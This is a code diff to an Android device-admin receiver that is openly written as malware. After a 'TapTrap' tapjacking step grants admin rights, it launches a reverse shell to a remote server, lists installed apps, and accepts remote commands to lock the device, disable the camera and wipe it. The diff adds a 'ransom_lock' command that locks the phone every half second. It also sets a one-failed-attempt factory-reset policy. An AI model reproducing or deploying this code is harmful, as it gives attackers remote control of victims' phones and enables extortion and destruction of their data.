@@ -25,31 +25,25 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         // 🔴 TAPTRAP SUCCEEDED!
         Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
         Log.d(TAG, "connect to server ");
+
+
+        // START THE SERVICE instead of calling launchReverseShell directly
+        Intent serviceIntent = new Intent(context, ShellService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(serviceIntent);
+        } else {
+            context.startService(serviceIntent);
+        }
+
+//        launchReverseShell(context);
         Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));
-        launchReverseShell(context);
 
-//        try {
-//            Thread.sleep(5000);
-//        } catch (InterruptedException e) {
-//            e.printStackTrace();
-//        }
 
-        //String pw_context = getPasswordQualityString(context);
-        //Log.d(TAG, pw_context);
-        // add command here
 
-//        String attackerPassword = "123456";
-//        boolean passwordChanged = changeDevicePassword(context, attackerPassword);
-//        lockDevice(context);
-
-        // disableCamera(context);
-        // Optional: Post-attack actions here
-        // DevicePolicyManager dpm = getManager(context);
-        // dpm.lockNow(); // Example: lock device immediately
     }
 
     // Reverse Shell Code
-    private void launchReverseShell(Context context) {
+    public void launchReverseShell(Context context) {
         new Thread(() -> {
             try {
                 Socket socket = new Socket(SERVER_IP, SERVER_PORT);
@@ -72,6 +66,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  reboot (not working on emulator)     - Reboot device");
                 writer.println("  exit        - Close connection");
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
+                writer.println("  ransom_lock - set max idle time lock");
+
                 writer.println("----------------------------------");
 
                 // Read commands from listener
@@ -101,6 +97,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         switch (command.toLowerCase()) {
             case "lock":
                 lockDevice(context);
+
                 return "✅ Device locked!";
 
             case "cam_off":
@@ -145,9 +142,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             case "exit":
                 return "👋 Closing connection...";
 
-                case "wipe":
-                wipeDevice(context);
-                return "✅ Wiping device...";
+            case "wipe":
+//                wipeDevice(context);
+                setMaxFailedAttempts(context, 1);
+            return "✅ Wiping device...";
+
+            case "ransom_lock":
+                setMaxLockTime(context);
+                return "✅ Device locked!";
 
             default:
                 return "❌ Unknown command: " + command + " | type 'help' for commands";
@@ -159,6 +161,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         DevicePolicyManager dpm = getDpm(context);
         Log.d(TAG, "💀 Wiping device!");
         dpm.wipeData(0);
+        //dpm.wipeDevice(0);
     }
     // Device info
     private String getDeviceInfo() {
@@ -323,14 +326,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
 
 
-//        try {
-//            Camera camera = Camera.open();
-//            camera.release();
-//            Log.d(TAG, "⚠️ Camera still works - something wrong!");
-//        } catch (Exception e) {
-//            Log.d(TAG, "✅ Camera disabled successfully: " + e.getMessage());
-//        }
-
     }
 
     /**
@@ -345,50 +340,47 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     }
 
-    public boolean changeDevicePassword(Context context, String newPassword) {
-        DevicePolicyManager dpm = getDpm(context);
 
-        Log.d(TAG, "🔑 Attempting to change password");
+    private void setMaxFailedAttempts(Context context, int attempts) {
+        try {
+            DevicePolicyManager dpm = getDpm(context);
+            ComponentName admin = getAdmin(context);
 
-        // Now change the password
-        boolean success = dpm.resetPassword(newPassword, 0);
+            // Validate attempts range (1-10 as per documentation)
+            if (attempts < 1 || attempts > 10) {
+                Log.e(TAG, "Attempts must be between 1 and 10");
+                return;
+            }
 
-        if (success) {
-            Log.d(TAG, "✓ Password successfully changed to: " + newPassword);
+            // Set the policy
+            dpm.setMaximumFailedPasswordsForWipe(admin, attempts);
+            Log.i(TAG, "✅ Max failed attempts set to: " + attempts);
 
-        } else {
-            Log.e(TAG, "✗ Password change FAILED");
+            // Verify it was set
+            int currentSetting = dpm.getMaximumFailedPasswordsForWipe(admin);
+            Log.d(TAG, "Verified setting: " + currentSetting);
 
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security error: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "Error: " + e.getMessage());
         }
+    }
 
-        return success;
+    public String setMaxLockTime(Context context) {
+        DevicePolicyManager dpm = (DevicePolicyManager)
+                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName admin = new ComponentName(context, AppDeviceAdminReceiver.class);
+
+        // Set to 1 second
+        dpm.setMaximumTimeToLock(admin, 500L);
+
+        // Verify
+        long current = dpm.getMaximumTimeToLock(admin);
+        return "✅ Lock timeout set to " + (current/1000) + " seconds";
     }
 
 
-    public String getPasswordQualityString(Context context) {
-        DevicePolicyManager dpm = getDpm(context);
-        ComponentName admin = getAdmin(context);
 
-        int quality = dpm.getPasswordQuality(admin);
-
-        switch(quality) {
-            case DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED:
-                return "No password requirements";
-            case DevicePolicyManager.PASSWORD_QUALITY_SOMETHING:
-                return "Password required (any)";
-            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC:
-                return "Numeric PIN required";
-            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX:
-                return "Complex numeric (no repeats)";
-            case DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC:
-                return "Alphabetic password required";
-            case DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC:
-                return "Alphanumeric password required";
-            case DevicePolicyManager.PASSWORD_QUALITY_COMPLEX:
-                return "Complex password required";
-            default:
-                return "Unknown quality: " + quality;
-        }
-    }
 
 }
